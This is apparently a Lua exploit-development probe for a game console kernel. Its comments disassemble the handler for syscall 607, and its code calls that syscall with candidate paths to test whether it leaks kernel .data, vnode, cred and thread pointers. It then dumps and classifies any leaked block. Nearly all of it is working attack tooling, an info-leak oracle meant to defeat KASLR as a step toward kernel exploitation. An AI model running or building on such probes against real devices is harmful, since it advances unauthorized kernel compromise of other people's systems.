-- CRASH_CLASS: LOW (two path lookups + one boundary case; no writes to kernel-chosen addresses)
-- PROBE 1249a: syscall 607 - the no-privilege KASLR / heap pointer oracle?
--
-- Body 0xabc710 (13.60), narg=2:
--   0xabc744 mov r12,[rsi]                  ; r12 = arg0 = path pointer
--   0xabc775 copyinstr(path, kern_buf 0x400)
--   0xabc7b8 call 0xafba6e0                 ; 7-arg VFS lookup (namei-like) on /app0 style path
--   0xabc7c9 mov r12,[rbp-0xb8]             ; r12 = resolved vnode
--   0xabc7e5 cmp dword [r12+0x1d4],1        ; gate A: vnode subtype must be 1, else EINVAL 22
--   0xabc7fd lea rcx,[rip+0x101dff4]        ; STATIC kernel .data pointer 0xffffffff8c49a7f8
--   0xabc815 mov [rbp-0x198],r12            ; vnode
--   0xabc826 mov [rbp-0x188],rax            ; cred
--   0xabc82d mov [rbp-0x180],rbx            ; td
--   0xabc9ad call 0x609c00(cred+0x58, &struct)   ; gate B: sanitizer, zeroes the block
--   0xabc9e9 mov edx,0x88 ; 0xabc9f1 call copyout(0x88) -> arg1
--
-- Gate B is the interesting one: 0x609c00 compares cred+0x58 against
-- 0x4800000000000010 and, unless equal, zeroes struct+0x00/+0x08/+0x10/.../+0x80.
-- It then also inspects [(cred+0x58)+0x17] and re-tests the same value against
-- 0x4800000000000007. The struct is 0x88 bytes, so a successful call hands userland
-- a static .data pointer, a live vnode pointer, the cred pointer and the thread
-- pointer - i.e. KASLR plus heap.
--
-- The point of the probe is the error code: EINVAL means gate A (wrong vnode type),
-- EPERM/1 means gate B, 0 means the oracle is open and we dump the block.
--
-- REV 2 (this run) - Lua 5.1 / loader ABI fixes:
--   * uint64.get_addr does not exist in this loader (rev 1 died on line 35 with
--     "attempt to call field 'get_addr' (a nil value)").  The address of a
--     memory.alloc() buffer is N(buf) - see 1188a_fcall_validate.lua:10.
--   * uint64.new does not exist either; uint64(x) is the constructor.
--   * rev 1's hexdump used string.format("%016X", N(qword)).  A Lua 5.1 double holds
--     53 bits, so every kernel pointer printed as a rounded value.  The dump now
--     prints the uint64's own .h/.l halves (the same split 1245a used to print an
--     mmap return correctly) and never converts a qword to a double for display.
--   * the supervisor-range scan likewise tests .h directly instead of comparing a
--     rounded double against 0xFFFF000000000000.
print("=== PROBE 1249a: syscall 607 path-metadata oracle ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function hilo(v) if type(v)=="table" and v.h then return v.h, v.l end return 0, N(v) end
local function qw(a)
  local ok, v = pcall(function() return memory.read_qword(a) end)
  if ok then return v end
  return nil
end
-- a qword as 16 hex digits, exact: hi and lo are separate 32-bit halves
local function qs(v)
  if v == nil then return "????????????????" end
  local h, l = hilo(v)
  return string.format("%08X_%08X", h, l)
end

local s607 = mk(607)
local buf  = memory.alloc(0x100)
local nb   = N(buf)
local pathbuf = memory.alloc(0x100)
local pbuf = N(pathbuf)

local function setpath(s)
  for k = 1, #s do wb(pbuf + k - 1, string.byte(s, k)) end
  wb(pbuf + #s, 0)
end

local function dump88(base)
  for r = 0, 0x80, 0x20 do
    local a = base + r
    print(string.format("    +%02X %s %s %s %s", r, qs(qw(a)), qs(qw(a+8)), qs(qw(a+0x10)), qs(qw(a+0x18))))
  end
end

-- 0xffffffff8c49a7f8 is the static .data pointer the body loads at 0xabc7fd.
-- If gate B ever opens, this is the qword that proves it.
local STATIC_PTR_HI = 0xFFFFFFFF
local function count_static(base)
  local hits = 0
  for i = 0, 0x80, 8 do
    local v = qw(base + i)
    if v ~= nil then
      local h, l = hilo(v)
      if h == STATIC_PTR_HI then
        print(string.format("    static-range qword at +%02X: %08X_%08X", i, h, l))
        hits = hits + 1
      end
    end
  end
  return hits
end

local function call607(path, label)
  -- fill with a pattern below 2^53 so uint64->double conversion cannot round it
  for i = 0, 0x87 do wb(nb + i, 0xA5) end
  setpath(path)
  local ok, v = pcall(function() return s607(uint64(pbuf), uint64(nb)) end)
  local rv = -999
  if ok then rv = N(v) end
  local e = ES()
  print(string.format("  %-22s rv=%d errno=\"%s\"", label, rv, e))
  if rv == 0 then
    dump88(nb)
    local sup, sent = 0, 0
    for i = 0, 0x80, 8 do
      local q = qw(nb + i)
      if q ~= nil then
        local h = hilo(q)
        if h >= 0xFFFF8000 then
          if h == 0xFFFFFFFF then sent = sent + 1 else sup = sup + 1 end
        end
      end
    end
    print(string.format("    supervisor qwords=%d  sentinel(0xFFFFFFFF_*) qwords=%d  static-ptr hits=%d",
          sup, sent, count_static(nb)))
  end
end

print(string.format("[0] pid=%d buf=0x%X pathbuf=0x%X", N(mk(20)()), nb, pbuf))

print("[1] 607(path, out0x88) over candidate paths")
call607("/app0/eboot.bin",  "/app0/eboot.bin")
call607("/dev/null",        "/dev/null")
call607("/",                "/")
call607("/app0",            "/app0")
call607("/user",            "/user")
call607("/dev",             "/dev")
call607("nosuchpath",       "nosuchpath")
call607("",                 "empty")

print("[2] argument-boundary controls")
local ok1, v1 = pcall(function() return s607(uint64(0), uint64(nb)) end)
print(string.format("  607(NULL, buf)          ok=%s rv=%s errno=\"%s\"", tostring(ok1), tostring(ok1 and N(v1) or "?"), ES()))
setpath("/app0/eboot.bin")
local ok2, v2 = pcall(function() return s607(uint64(pbuf), uint64(0)) end)
print(string.format("  607(path, NULL)         ok=%s rv=%s errno=\"%s\"", tostring(ok2), tostring(ok2 and N(v2) or "?"), ES()))
print("=== DONE 1249a ===")
